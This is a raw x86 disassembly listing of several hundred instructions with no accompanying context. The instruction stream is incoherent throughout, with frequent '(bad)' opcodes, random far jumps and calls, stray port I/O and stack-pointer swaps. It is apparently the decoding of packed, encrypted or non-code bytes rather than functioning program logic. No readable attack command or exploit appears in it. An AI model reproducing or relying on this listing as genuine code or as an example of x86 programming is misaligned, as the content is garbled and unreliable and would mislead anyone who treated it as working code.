  426d76:	sub    BYTE PTR [esi-0x7a8be8b7],0xad
  426d7d:	ins    DWORD PTR es:[edi],dx
  426d7e:	mov    dl,BYTE PTR [esi-0x40d67306]
  426d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d85:	rcr    edx,0xda
  426d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d89:	test   DWORD PTR [ebx+eiz*4+0x1cff8c27],edx
  426d90:	mov    ecx,0x4d05ef86
  426d95:	push   ebp
  426d96:	pop    esp
  426d97:	ret    0x555c
  426d9a:	add    al,0x5c
  426d9c:	mov    BYTE PTR [eax],dh
  426d9e:	inc    eax
  426d9f:	sub    al,0xa2
  426da1:	push   es
  426da2:	leave  
  426da3:	mov    cl,0xd4
  426da5:	add    esp,ebx
  426da7:	xor    cl,BYTE PTR cs:[edx+0xd3e257a]
  426dae:	mov    al,0x5d
  426db0:	xor    BYTE PTR [eax+0x5e2d12bd],dh
  426db6:	push   eax
  426db7:	xchg   ebx,esp
  426db9:	call   0x7894dec
  426dbe:	enter  0xa215,0xeb
  426dc2:	jo     0x426d63
  426dc4:	adc    eax,0xc5b76c0e
  426dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dca:	mov    BYTE PTR [eax+0x2df0c66e],cl
  426dd0:	ins    DWORD PTR es:[edi],dx
  426dd1:	inc    ebx
  426dd2:	aad    0xad
  426dd4:	(bad)  
  426dd6:	dec    esp
  426dd7:	mul    dl
  426dd9:	push   cs
  426dda:	icebp  
  426ddb:	(bad)  
  426ddc:	push   0xffffff8a
  426dde:	mov    edx,0x5cc7686d
  426de3:	out    dx,al
  426de4:	test   DWORD PTR [eax+0x155da8c9],edi
  426dea:	fcomp  QWORD PTR [eax-0xa]
  426ded:	inc    edx
  426dee:	mov    WORD PTR [edi-0x6e],ds
  426df1:	push   cs
  426df2:	mov    BYTE PTR [ebx-0x1c],bl
  426df5:	adc    eax,0x385dcc9e
  426dfa:	fist   DWORD PTR [edi+0x17]
  426dfd:	fimul  DWORD PTR [ebx+0x4a]
  426e00:	sub    DWORD PTR [esi],edx
  426e02:	cmp    DWORD PTR [esi+0xb62ad50],edi
  426e08:	outs   dx,BYTE PTR ds:[esi]
  426e09:	dec    ebx
  426e0a:	in     eax,dx
  426e0b:	adc    ah,BYTE PTR [edx+edi*4+0x30]
  426e0f:	push   0xe9bfabc8
  426e14:	inc    ebp
  426e15:	push   0xcba81b5b
  426e1a:	outs   dx,DWORD PTR ds:[esi]
  426e1b:	dec    edi
  426e1c:	loop   0x426dab
  426e1e:	push   esi
  426e1f:	jb     0x426e54
  426e21:	outs   dx,DWORD PTR ds:[esi]
  426e22:	pop    esp
  426e23:	push   0xffffffd2
  426e25:	sub    dh,BYTE PTR [ebp-0x7]
  426e28:	add    dh,bh
  426e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e2b:	or     esi,DWORD PTR [esi-0x3ebb292a]
  426e31:	mov    WORD PTR [ebp+eiz*8-0x25627820],ss
  426e38:	push   cs
  426e39:	mov    ch,ch
  426e3b:	add    eax,0x989cc5b1
  426e40:	sar    BYTE PTR [esi+0xe],cl
  426e43:	mov    bh,0xb6
  426e45:	ins    DWORD PTR es:[edi],dx
  426e46:	fcomp  QWORD PTR [ebx-0x254ba095]
  426e4c:	mov    al,0xdb
  426e4e:	(bad)  
  426e50:	sbb    DWORD PTR ds:0xa22d6db,ebx
  426e56:	jns    0x426ec5
  426e58:	push   esi
  426e59:	xlat   BYTE PTR ds:[ebx]
  426e5a:	pop    esp
  426e5b:	mov    ds,esp
  426e5d:	pop    eax
  426e5e:	push   0x4
  426e60:	pop    es
  426e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e62:	cs daa 
  426e64:	ins    BYTE PTR es:[edi],dx
  426e65:	xchg   ebx,eax
  426e66:	mov    dh,0xad
  426e68:	pop    ebp
  426e69:	push   0xcb2f5ed8
  426e6e:	ret    0x8d38
  426e71:	push   esi
  426e72:	jb     0x426eb5
  426e74:	(bad)  [eax+0x17]
  426e77:	or     ah,BYTE PTR [edi+0x284e44a8]
  426e7d:	outs   dx,DWORD PTR ds:[esi]
  426e7e:	test   DWORD PTR [esi+0x3341da0b],esi
  426e84:	or     ebx,DWORD PTR [esi+0x2edd02d9]
  426e8a:	pop    ebx
  426e8b:	pop    ebx
  426e8c:	mov    al,ds:0xc5501db6
  426e91:	fdivr  DWORD PTR [ebx-0x498b6189]
  426e97:	ins    DWORD PTR es:[edi],dx
  426e98:	sub    al,0x6c
  426e9a:	inc    edi
  426e9b:	stos   DWORD PTR es:[edi],eax
  426e9c:	adc    ebx,DWORD PTR [edi-0x1e0abc00]
  426ea2:	pop    esp
  426ea3:	mov    bh,0x2
  426ea5:	ins    DWORD PTR es:[edi],dx
  426ea6:	fstp   TBYTE PTR [esp+edi*4-0x104ea9d0]
  426ead:	fstp   QWORD PTR [edx+0x76d6ed53]
  426eb3:	push   esp
  426eb4:	test   eax,0x82ca351
  426eb9:	das    
  426eba:	push   eax
  426ebb:	pop    esp
  426ebc:	ret    0xdb12
  426ebf:	push   es
  426ec0:	aam    0x97
  426ec2:	push   0xe8e243f6
  426ec7:	call   0x86055154
  426ecc:	cs out 0x39,eax
  426ecf:	int    0x3e
  426ed1:	mov    eax,0x6fdd4035
  426ed6:	stc    
  426ed7:	adc    cl,BYTE PTR [esi+0x7cc96201]
  426edd:	sbb    bh,BYTE PTR ss:[ebx-0xf18b456]
  426ee4:	jmp    0x960b:0x5b6e8857
  426eeb:	shl    DWORD PTR [ecx+0xe],1
  426eee:	jmp    0xcd04da88
  426ef3:	sub    eax,0x59db6d04
  426ef8:	dec    esi
  426ef9:	mov    WORD PTR [esi-0x4d],ss
  426efc:	and    BYTE PTR ds:0x1535b023,bh
  426f02:	cdq    
  426f03:	sub    ch,cl
  426f05:	sbb    al,0x66
  426f07:	push   es
  426f08:	ins    DWORD PTR es:[edi],dx
  426f09:	adc    BYTE PTR [ebx+ecx*1+0x7c],ch
  426f0d:	jl     0x426f83
  426f0f:	xor    BYTE PTR [eax-0x7b],al
  426f12:	les    edx,FWORD PTR [esi]
  426f14:	inc    ebp
  426f15:	add    eax,DWORD PTR [ebx-0x245c2c8b]
  426f1b:	pusha  
  426f1c:	xor    DWORD PTR [edx+0x6b],0x1d
  426f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f21:	inc    esp
  426f22:	ins    DWORD PTR es:[edi],dx
  426f23:	mov    eax,ds:0x7507609b
  426f28:	loope  0x426f54
  426f2a:	out    0xfb,al
  426f2c:	jecxz  0x426f48
  426f2e:	out    dx,eax
  426f2f:	fild   DWORD PTR [ebx]
  426f31:	pop    esp
  426f32:	jne    0x426f45
  426f34:	pop    esi
  426f35:	fs ds jne 0x426fa5
  426f39:	sbb    ebp,ebp
  426f3b:	inc    esi
  426f3c:	sbb    ebx,DWORD PTR [ecx]
  426f3e:	cli    
  426f3f:	bound  eax,QWORD PTR [esi]
  426f41:	jle    0x426fba
  426f43:	lods   eax,DWORD PTR ds:[esi]
  426f44:	fcmovnb st,st(2)
  426f46:	mov    dh,0x2d
  426f48:	div    DWORD PTR [esi+eiz*1]
  426f4b:	xchg   BYTE PTR [edi-0x3732e018],cl
  426f51:	out    0x35,eax
  426f53:	sub    eax,0x8a384b6d
  426f58:	mov    dh,0xdc
  426f5a:	dec    edx
  426f5b:	iret   
  426f5c:	cmc    
  426f5d:	shl    DWORD PTR [esi+0x1],0xb0
  426f61:	mov    al,0x5c
  426f63:	adc    eax,0x1f42f5af
  426f68:	sub    al,0xb8
  426f6a:	mov    cl,0xb5
  426f6c:	aam    0xe6
  426f6e:	jno    0x426fc6
  426f70:	dec    edi
  426f71:	(bad)  
  426f72:	int3   
  426f73:	test   al,0x6d
  426f75:	ret    0x8402
  426f78:	mov    ecx,DWORD PTR [eax+0x4c4c4757]
  426f7e:	aad    0x8e
  426f80:	jmp    0x3681:0x48d0e0b8
  426f87:	mov    esi,DWORD PTR [esi+0x23f620dd]
  426f8d:	je     0x426fbe
  426f8f:	js     0x426f62
  426f91:	or     DWORD PTR [eax+0xb],edx
  426f94:	pop    ebx
  426f95:	mov    ds:0x13ecc07,eax
  426f9a:	push   0x24
  426f9c:	sbb    eax,0xf75a1741
  426fa1:	push   edx
  426fa2:	cmp    DWORD PTR [eax-0x64],eax
  426fa5:	sar    BYTE PTR [esi-0x1b7ffc50],0x89
  426fac:	jo     0x426ffc
  426fae:	jns    0x426f5e
  426fb0:	add    BYTE PTR [ecx+eax*1+0x36],bh
  426fb4:	outs   dx,BYTE PTR ds:[esi]
  426fb5:	fist   DWORD PTR [esi-0x4d]
  426fb8:	popf   
  426fb9:	mov    DWORD PTR [esi-0x3f0cd2f],ecx
  426fbf:	fs pop eax
  426fc1:	mov    esi,0xf98aa2d1
  426fc6:	dec    ecx
  426fc7:	add    BYTE PTR [edx],cl
  426fc9:	dec    ebp
  426fca:	outs   dx,BYTE PTR ds:[esi]
  426fcb:	aad    0xa8
  426fcd:	push   0x687ea880
  426fd2:	add    edx,ebp
  426fd4:	lea    eax,[esi]
  426fd6:	fisub  DWORD PTR [ecx]
  426fd8:	enter  0x9bd3,0xbb
  426fdc:	sub    eax,0x163d6d6c
  426fe1:	add    ah,BYTE PTR [edi-0x4b5b921]
  426fe7:	in     eax,0x5
  426fe9:	jge    0x426fe7
  426feb:	mov    edx,0xf55c6d6d
  426ff0:	sbb    bl,al
  426ff2:	out    dx,eax
  426ff3:	cmp    eax,0x4b275877
  426ff8:	pop    eax
  426ff9:	sub    BYTE PTR [ebp-0x49d79693],0x8c
  427000:	in     al,0x7f
  427002:	cmp    al,0xc6
  427004:	lods   eax,DWORD PTR ds:[esi]
  427005:	ins    DWORD PTR es:[edi],dx
  427006:	sub    BYTE PTR [edi+eiz*4+0x3a],cl
  42700a:	mov    dh,0xe9
  42700c:	sti    
  42700d:	jns    0x427012
  42700f:	add    eax,0xd7b768dc
  427014:	ss push ds
  427016:	adc    DWORD PTR ds:0xd542195f,edx
  42701c:	mov    dh,0x1d
  42701e:	es ds icebp 
  427021:	push   esi
  427022:	cdq    
  427023:	out    dx,eax
  427024:	ret    0xb4b6
  427027:	xchg   ebp,eax
  427028:	mov    al,ds:0xc868e3db
  42702d:	mov    ebp,0xed4b1bb3
  427032:	(bad)  
  427033:	shl    BYTE PTR [eax+0x55],cl
  427036:	push   cs
  427037:	into   
  427038:	and    edi,DWORD PTR [ebx]
  42703a:	movq   QWORD PTR [esi+0x2065b54b],xmm6
  427042:	cdq    
  427043:	or     BYTE PTR [ebx-0x5c],dh
  427046:	fwait
  427047:	push   esi
  427048:	(bad)  
  427049:	aad    0xd2
  42704b:	(bad)  
  42704c:	(bad)  
  42704d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42704f:	rol    DWORD PTR [esi+eax*2],1
  427052:	cwde   
  427053:	xor    al,0x14
  427055:	rol    DWORD PTR ss:[esi],0xc7
  427059:	mov    ds:0xd71c241,al
  42705e:	jno    0x4270b9
  427060:	push   0x7a8bf81d
  427065:	call   0x3433:0x74eb7322
  42706c:	add    DWORD PTR [eax+0x37d1c7e4],esi
  427072:	ror    DWORD PTR [edx],cl
  427074:	pop    eax
  427075:	add    BYTE PTR [esp+ebp*1-0x25],bl
  427079:	jg     0x4270e8
  42707b:	mov    bh,BYTE PTR [eax-0x14e1602f]
  427081:	mov    ds:0x6a8140c3,al
  427086:	nop
  427087:	mov    ds:0xc73211ad,eax
  42708c:	lods   al,BYTE PTR ds:[esi]
  42708d:	cli    
  42708e:	scas   al,BYTE PTR es:[edi]
  42708f:	loop   0x4270e7
  427091:	stos   DWORD PTR es:[edi],eax
  427092:	cmp    BYTE PTR ds:0xdb3c860b,bh
  427098:	ins    DWORD PTR es:[edi],dx
  427099:	arpl   WORD PTR [ebx+0x18135d11],cx
  42709f:	mov    ds:0xa12e2ac2,al
  4270a4:	je     0x42710e
  4270a6:	add    DWORD PTR [ebp+0x11],ecx
  4270a9:	pop    edx
  4270aa:	mov    dh,0xa2
  4270ac:	push   edx
  4270ad:	mov    ch,0x6e
  4270af:	pop    ebx
  4270b0:	int    0xbc
  4270b2:	loopne 0x427090
  4270b4:	gs inc ebx
  4270b6:	jmp    0xadaccc2c
  4270bb:	lods   eax,DWORD PTR ds:[esi]
  4270bc:	and    bl,BYTE PTR [edx-0xf]
  4270bf:	mov    ebx,0x58d75f62
  4270c4:	stos   BYTE PTR es:[edi],al
  4270c5:	sub    BYTE PTR [ebx+eax*2-0x7e],dl
  4270c9:	push   eax
  4270ca:	mov    bh,0x16
  4270cc:	cmp    al,BYTE PTR [edx]
  4270ce:	mov    ebx,edx
  4270d0:	sar    BYTE PTR [edi-0x343c00db],1
  4270d6:	inc    ecx
  4270d7:	pop    ss
  4270d8:	adc    DWORD PTR [edi+edi*8-0x47],ebx
  4270dc:	jg     0x4270b9
  4270de:	ret    0x6d8d
  4270e1:	sahf   
  4270e2:	out    0x66,al
  4270e4:	lea    edi,[edx+esi*2]
  4270e7:	mov    edi,DWORD PTR [eax+ecx*1-0x7e]
  4270eb:	ins    DWORD PTR es:[edi],dx
  4270ec:	add    DWORD PTR [esi-0x48fec4e6],esi
  4270f2:	mov    al,ds:0x3ada3e77
  4270f7:	call   0xb2071a42
  4270fc:	sub    BYTE PTR [eax+0x3e],bh
  4270ff:	in     eax,0xeb
  427101:	add    BYTE PTR [eax+0x9],ch
  427104:	lock in al,0xd9
  427107:	das    
  427108:	fwait
  427109:	or     eax,0x44751722
  42710e:	pop    ss
  42710f:	mov    bh,0x89
  427111:	inc    edi
  427112:	jo     0x4270ef
  427114:	mov    dh,0x8f
  427116:	inc    ecx
  427117:	sub    DWORD PTR [ecx],ebp
  427119:	(bad)  
  42711a:	loopne 0x427128
  42711c:	pop    ds
  42711d:	mov    ds:0x616d8a9a,eax
  427122:	sbb    eax,0xa18791c7
  427127:	test   eax,0x825167be
  42712c:	or     dh,BYTE PTR [edi]
  42712e:	xchg   DWORD PTR [eax],ebx
  427130:	cwde   
  427131:	adc    ebp,DWORD PTR [esi-0x4f47a7de]
  427137:	xchg   ebx,eax
  427138:	fstp   TBYTE PTR [esi+0x4a9d9ee2]
  42713e:	push   edi
  42713f:	ins    DWORD PTR es:[edi],dx
  427140:	xchg   edi,eax
  427141:	call   0x95f6:0x74fb9fc8
  427148:	cli    
  427149:	push   0x6d
  42714b:	imul   edx,DWORD PTR [edi],0x28
  42714e:	js     0x42719e
  427150:	test   al,0x5c
  427152:	jmp    0x1dc32797
  427157:	inc    eax
  427158:	(bad)  [esp+ebx*8-0x7e894083]
  42715f:	dec    esp
  427160:	mov    dh,0xd
  427162:	stos   BYTE PTR es:[edi],al
  427163:	and    esi,DWORD PTR [ebp+0x4d22355c]
  427169:	jo     0x427157
  42716b:	mov    al,ds:0x39cbd1b8
  427170:	add    BYTE PTR [edx+0x0],0xb9
  427174:	test   BYTE PTR [ebx+0x6e],bl
  427177:	cmp    DWORD PTR [edx],ebp
  427179:	pop    ds
  42717a:	mov    dl,0x1
  42717c:	push   0xc0b63e23
  427181:	ins    DWORD PTR es:[edi],dx
  427182:	rol    DWORD PTR [eax+0x21],0x64
  427186:	out    dx,al
  427187:	mov    al,0x57
  427189:	push   edi
  42718a:	call   0x79b8:0x3c436da2
  427191:	dec    ebp
  427192:	cmp    DWORD PTR [edi+0x60a190f2],edi
  427198:	xor    DWORD PTR [ebx+0x41af1b6],0xc89d56db
  4271a2:	mov    eax,ds:0x1d6e9dfe
  4271a7:	inc    esp
  4271a8:	pop    ss
  4271a9:	and    dl,BYTE PTR [ebx-0x64f76df3]
  4271af:	retf   0x4c0a
  4271b2:	ins    BYTE PTR es:[edi],dx
  4271b3:	fcmovnbe st,st(6)
  4271b5:	sahf   
  4271b6:	(bad)  
  4271b7:	out    0x32,eax
  4271b9:	mov    ds:0x703a72a4,eax
  4271be:	fld    TBYTE PTR [eax+0x37]
  4271c1:	xor    BYTE PTR [edx+0x7c18200b],bh
  4271c7:	ret    0x20cf
  4271ca:	pop    ebp
  4271cb:	add    bl,bl
  4271cd:	lods   eax,DWORD PTR ds:[esi]
  4271ce:	popa   
  4271cf:	push   esi
  4271d0:	jns    0x427223
  4271d2:	repnz mov dl,BYTE PTR [ebp-0x4a]
  4271d6:	das    
  4271d7:	ins    DWORD PTR es:[edi],dx
  4271d8:	or     ecx,DWORD PTR [ebx-0x20]
  4271db:	fwait
  4271dc:	dec    ecx
  4271dd:	fmul   DWORD PTR [edx+0x45]
  4271e0:	push   eax
  4271e1:	out    0x62,eax
  4271e3:	add    BYTE PTR [ebx],bl
  4271e5:	or     eax,0x9858cb44
  4271ea:	in     al,0xde
  4271ec:	adc    ch,BYTE PTR [edi-0x64]
  4271ef:	mov    ebx,0xa46c6ed4
  4271f4:	adc    al,0x9
  4271f6:	jae    0x42721e
  4271f8:	sbb    dl,BYTE PTR [ecx]
  4271fa:	cld    
  4271fb:	repnz bound ecx,QWORD PTR [edx+0x0]
  4271ff:	in     eax,dx
  427200:	inc    edx
  427201:	hlt    
  427202:	mov    DWORD PTR [ebp-0x4a4b971a],ebx
  427208:	push   eax
  427209:	and    ah,bl
  42720b:	and    eax,0xdadc8b28
  427210:	lea    eax,[ebp+0x667d246]
  427216:	push   ecx
  427217:	add    cl,BYTE PTR [ebx+0x35b6e17a]
  42721d:	test   al,0xa0
  42721f:	push   ebx
  427220:	frstor [ebp-0x57]
  427223:	mov    ah,0x22
  427225:	mov    ch,0xb0
  427227:	mov    ch,0x6d
  427229:	mov    edx,0x775cd114
  42722e:	int    0x28
  427230:	ret    
  427231:	(bad)  
  427233:	loope  0x4271eb
  427235:	pop    ds
  427236:	das    
  427237:	aam    0xd1
  427239:	jo     0x42722c
  42723b:	sbb    DWORD PTR [ecx],0xffffffed
  42723e:	mov    ebx,0x4b0b5bb5
  427243:	push   cs
  427244:	jb     0x4271c8
  427246:	pop    esp
  427247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427248:	mov    ecx,0xfca0fbd0
  42724d:	ret    0xe242
  427250:	inc    edi
  427251:	sbb    al,0xc3
  427253:	iret   
  427254:	add    cl,dl
  427256:	jle    0x4271dd
  427258:	(bad)  
  427259:	lods   eax,DWORD PTR ds:[esi]
  42725a:	pop    ebp
  42725b:	add    ecx,esi
  42725d:	(bad)
  427261:	retf   0x7ccc
  427264:	push   eax
  427265:	pop    esp
  427266:	push   0xffffffb7
  427268:	pop    ds
  427269:	out    0xc9,al
  42726b:	pop    ds
  42726c:	or     edi,DWORD PTR [edx+0x7]
  42726f:	dec    esi
  427270:	imul   ebp,DWORD PTR [ebx+0x40],0xc476435
  427277:	adc    al,0xfd
  427279:	sti    
  42727a:	fadd   DWORD PTR [ebp+0x75]
  42727d:	popa   
  42727e:	sub    DWORD PTR [ecx-0x67],esp
  427281:	and    ch,al
  427283:	cmp    DWORD PTR [eax+0x5b6d8179],ecx
  427289:	sbb    DWORD PTR [esi-0x6b],eax
  42728c:	add    al,0xb3
  42728e:	mov    eax,ds:0x4400fa69
  427293:	push   0x5
  427295:	xchg   ebp,eax
  427296:	pusha  
  427297:	xchg   edi,eax
  427298:	dec    edx
  427299:	les    ecx,FWORD PTR [esi-0x33dae47e]
  42729f:	xor    BYTE PTR [edi+0x17],dl
  4272a2:	push   es
  4272a3:	mov    cs,WORD PTR [eax-0x247d3ab3]
  4272a9:	xor    BYTE PTR [edx+0x75],0x4c
  4272ad:	mov    ah,0xf1
  4272af:	aam    0xad
  4272b1:	inc    ebx
  4272b2:	jg     0x427333
  4272b4:	scas   al,BYTE PTR es:[edi]
  4272b5:	adc    eax,0xb7f98aa4
  4272ba:	lods   eax,DWORD PTR ds:[esi]
  4272bb:	mov    DWORD PTR [edx-0x14f7fae6],edi
  4272c1:	fwait
  4272c2:	add    eax,0xbe6ae050
  4272c7:	outs   dx,BYTE PTR ds:[esi]
  4272c8:	sbb    ecx,ebx
  4272ca:	or     edx,DWORD PTR [edx-0x3f]
  4272cd:	add    BYTE PTR [esp+ecx*2-0x63a348c7],cl
  4272d4:	sub    bl,BYTE PTR [ebx-0x25]
  4272d7:	mov    gs,WORD PTR [eax]
  4272d9:	pop    ebx
  4272da:	sub    BYTE PTR [eax+0x1a],bl
  4272dd:	push   0xb1b64a1c
  4272e2:	jne    0x427328
  4272e4:	test   BYTE PTR [eax-0x1d],cl
  4272e7:	retf   
  4272e8:	jle    0x427298
  4272ea:	pop    ecx
  4272eb:	mov    edx,0x12db6e15
  4272f0:	cmp    al,bl
  4272f2:	bound  ecx,QWORD PTR [ecx+edi*8]
  4272f5:	and    eax,0x685661f8
  4272fa:	pop    ebx
  4272fb:	jmp    0xf5c8:0x68fc322a
  427302:	sbb    BYTE PTR [edx+0x3b05b6a0],0x60
  427309:	sub    DWORD PTR [edi],0xffffff89
  42730c:	adc    DWORD PTR [ebp+0x11],esi
  42730f:	ins    BYTE PTR es:[edi],dx
  427310:	xchg   edi,eax
  427311:	add    eax,0x6fe0e01
  427316:	pop    ecx
  427317:	scas   eax,DWORD PTR es:[edi]
  427318:	or     ebx,ebx
  42731a:	mov    dh,0xb0
  42731c:	aam    0x3d
  42731e:	jl     0x427356
  427320:	push   0x420da6e
  427325:	jbe    0x427341
  427327:	mov    dh,BYTE PTR [esi-0x63c771f5]
  42732d:	and    BYTE PTR [edx],bh
  42732f:	adc    ebp,eax
  427331:	or     ecx,DWORD PTR [ebx]
  427333:	mov    ?,WORD PTR [esi+0x6d0d5391]
  427339:	das    
  42733a:	jns    0x4273b9
  42733c:	mov    ah,0xb0
  42733e:	mov    cl,0x45
  427340:	push   cs
  427341:	out    dx,eax
  427342:	jnp    0x42736f
  427344:	call   0xd89c7432
  427349:	push   eax
  42734a:	jmp    0x4c686ef5
  42734f:	mov    cl,0x5c
  427351:	push   0x202c13eb
  427356:	jmp    0x5652b932
  42735b:	push   eax
  42735c:	push   cs
  42735d:	add    BYTE PTR [ebx],al
  42735f:	sub    bl,dh
  427361:	fild   DWORD PTR ds:0x69cab6d0
  427367:	xor    ah,BYTE PTR [edx-0x35]
  42736a:	mov    eax,0xb710cbed
  42736f:	es push 0x5d
  427372:	push   edx
  427373:	sbb    ebp,DWORD PTR [esi-0x1b]
  427376:	and    dl,BYTE PTR [edi-0x78f3f54a]
  42737c:	mov    ebx,0x8d39c284
  427381:	stos   BYTE PTR es:[edi],al
  427382:	dec    ebp
  427383:	add    DWORD PTR [ebx],ecx
  427385:	dec    ecx
  427386:	jb     0x427398
  427388:	call   0x6c6de182
  42738d:	cmp    edi,ebp
  42738f:	cwde   
  427390:	xor    eax,0x7a6dc06b
  427395:	sbb    esp,DWORD PTR [ebx]
  427397:	cs sub al,0x74
  42739a:	aam    0xa3
  42739c:	icebp  
  42739d:	mov    ebp,0x7ad34ef
  4273a2:	jo     0x427378
  4273a4:	xor    eax,0x1f16952e
  4273a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273aa:	ficom  DWORD PTR [edx-0x3e57c0d0]
  4273b0:	ret    0x285
  4273b3:	mov    WORD PTR [ecx+0x1bbb4fed],ss
  4273b9:	sub    BYTE PTR [eax-0x2aeeeb30],bh
  4273bf:	push   ss
  4273c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273c1:	cld    
  4273c2:	imul   ebx,DWORD PTR [ecx+0x58],0xf5649fea
  4273c9:	sti    
  4273ca:	add    al,0xff
  4273cc:	dec    ecx
  4273cd:	inc    ecx
  4273ce:	fld    TBYTE PTR [ebp-0x61c9c93]
  4273d4:	cs jp  0x4273d5
  4273d7:	les    ebp,FWORD PTR [edx-0x50]
  4273da:	bound  esi,QWORD PTR [ecx+0x4342db8]
  4273e0:	push   cs
  4273e1:	push   esp
  4273e2:	test   DWORD PTR [ebx-0x299e24a7],esi
  4273e8:	test   al,0xe
  4273eb:	test   al,0x38
  4273ed:	lock test al,0xef
  4273f0:	bound  edi,QWORD PTR [ebx-0x247048a5]
  4273f6:	ret    0x52e2
  4273f9:	jl     0x4273ea
  4273fb:	jge    0x4273f5
  4273fd:	sbb    BYTE PTR [esi],dl
  4273ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427400:	sub    BYTE PTR [ebx],bl
  427402:	mov    edx,0xaa045d88
  427407:	push   esi
  427408:	ror    DWORD PTR [ecx+0x14],cl
  42740b:	test   DWORD PTR [esi-0x27],esi
  42740e:	ss fmul st,st(5)
  427411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427412:	ret    0x80f9
  427415:	xchg   ebp,eax
  427416:	std    
  427417:	ror    BYTE PTR [edx],1
  427419:	push   ss
  42741a:	fimul  DWORD PTR [ebx-0x38]
  42741d:	retf   
  42741e:	xchg   edi,eax
  42741f:	addr16 push cs
  427421:	fnsave [esi+0x6246b512]
  427427:	sbb    DWORD PTR [ebx-0x68],ebp
  42742a:	xchg   ebp,eax
  42742b:	out    0x52,al
  42742d:	xchg   esi,eax
  42742e:	add    dh,BYTE PTR [esi+0x1ac505b6]
  427434:	sti    
  427435:	(bad)  
  427437:	test   DWORD PTR [edi],ebp
  427439:	ins    BYTE PTR es:[edi],dx
  42743a:	and    bl,al
  42743c:	inc    edi
  42743d:	mov    bh,0xf6
  42743f:	jmp    0x4273eb
  427441:	jl     0x427479
  427443:	add    BYTE PTR [eax],cl
  427445:	adc    DWORD PTR [edi],esi
  427447:	mov    dh,0xf2
  427449:	fild   DWORD PTR [eax]
  42744b:	jno    0x427455
  42744d:	inc    edi
  42744e:	inc    esp
  42744f:	or     al,0x3
  427451:	je     0x42745e
  427453:	ins    DWORD PTR es:[edi],dx
  427454:	(bad)  [edx]
  427456:	mov    bl,0x65
  427458:	cmp    al,0xd1
  42745a:	adc    DWORD PTR [eax],edx
  42745c:	mov    dl,0x28
  42745e:	ins    BYTE PTR es:[edi],dx
  42745f:	inc    ecx
  427460:	mov    ah,0x6
  427462:	aam    0x9f
  427464:	xchg   edi,eax
  427465:	out    dx,al
  427466:	mov    dl,bl
  427468:	inc    ebp
  427469:	pop    ebp
  42746a:	sbb    BYTE PTR [eax],0xa7
  42746d:	adc    eax,0x5b0b6717
  427472:	add    edx,ebp
  427474:	or     ebx,DWORD PTR [ebx]
  427476:	das    
  427477:	cmp    esi,esp
  427479:	cmp    cl,dl
  42747b:	fstp   TBYTE PTR [edx]
  42747d:	sbb    BYTE PTR [ebx+0x1],0x5f
  427481:	sub    DWORD PTR cs:[esi],ecx
  427484:	mov    dh,0x69
  427486:	cwde   
  427487:	mov    dh,0x6d
  427489:	mov    bh,0x6d
  42748b:	or     eax,0x668ca308
  427490:	adc    al,0x50
  427492:	fsubr  QWORD PTR [eax+0x7e]
  427495:	enter  0xd6d,0xd5
  427499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42749a:	sahf   
  42749b:	fwait
  42749c:	iret   
  42749d:	adc    DWORD PTR [eax-0x4bbe033e],ecx
  4274a3:	inc    ebp
  4274a4:	mov    cl,0x9e
  4274a6:	out    0x58,eax
  4274a8:	pusha  
  4274a9:	ins    DWORD PTR es:[edi],dx
  4274aa:	stos   DWORD PTR es:[edi],eax
  4274ab:	fmul   DWORD PTR cs:[ecx+0x60613bad]
  4274b2:	add    dh,BYTE PTR [eax+0x4760994d]
  4274b8:	ror    esi,1
  4274ba:	sub    al,0x76
  4274bc:	inc    ebp
  4274bd:	add    ebx,esp
  4274bf:	pop    edx
  4274c0:	inc    esp
  4274c1:	mov    ebx,0x24f75c55
  4274c6:	pop    ss
  4274c7:	or     dh,BYTE PTR [edx]
  4274c9:	ins    DWORD PTR es:[edi],dx
  4274ca:	fst    QWORD PTR [esi+0x2d0bd7a7]
  4274d0:	sbb    BYTE PTR [esi+0x1f],dh
  4274d3:	pop    edi
  4274d4:	mov    al,0xb0
  4274d6:	cmp    eax,0x4b7fdf
  4274db:	stos   BYTE PTR es:[edi],al
  4274dc:	pop    ds
  4274dd:	xchg   edi,eax
  4274de:	sbb    eax,0xc0d6cd41
  4274e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274e4:	mov    eax,0x8f388eb4
  4274e9:	div    BYTE PTR [ebx-0x1b]
  4274ec:	pop    esi
  4274ed:	imul   DWORD PTR [ebp+0x65]
  4274f0:	popa   
  4274f1:	adc    esp,ebx
  4274f3:	out    0xb3,eax
  4274f5:	xor    al,0x3b
  4274f7:	push   cs
  4274f8:	sub    ch,BYTE PTR [edx]
  4274fa:	outs   dx,BYTE PTR ds:[esi]
  4274fb:	pop    ebx
  4274fc:	sbb    ebp,esi
  4274fe:	aas    
  4274ff:	or     bl,ch
  427501:	ja     0x4274ca
  427503:	lea    esi,[ebx]
  427505:	jne    0x427518
  427507:	fwait
  427508:	test   eax,0x4c5eb421
  42750d:	mov    al,0x3e
  42750f:	jbe    0x4274ba
  427511:	je     0x427576
  427513:	les    esp,FWORD PTR [esi-0x13]
  427516:	xor    DWORD PTR [edx],eax
  427518:	bound  edi,QWORD PTR [ecx]
  42751a:	jl     0x427505
  42751c:	lea    ebp,[edx-0x49]
  42751f:	mov    dh,0x32
  427521:	jb     0x42750b
  427523:	cmc    
  427524:	mov    dl,BYTE PTR [edi+edi*1]
  427527:	inc    esi
  427528:	(bad)  [esi+0x6d7b158d]
  42752e:	pop    esp
  42752f:	jmp    0xb6da:0xded4cb1a
  427536:	pop    ebx
  427537:	jmp    0xfc28f2a3
  42753c:	add    eax,ebx
  42753e:	push   cs
  42753f:	lods   eax,DWORD PTR ds:[esi]
  427540:	retf   
  427541:	in     al,dx
  427542:	and    BYTE PTR [esi],0x4a
  427545:	push   ecx
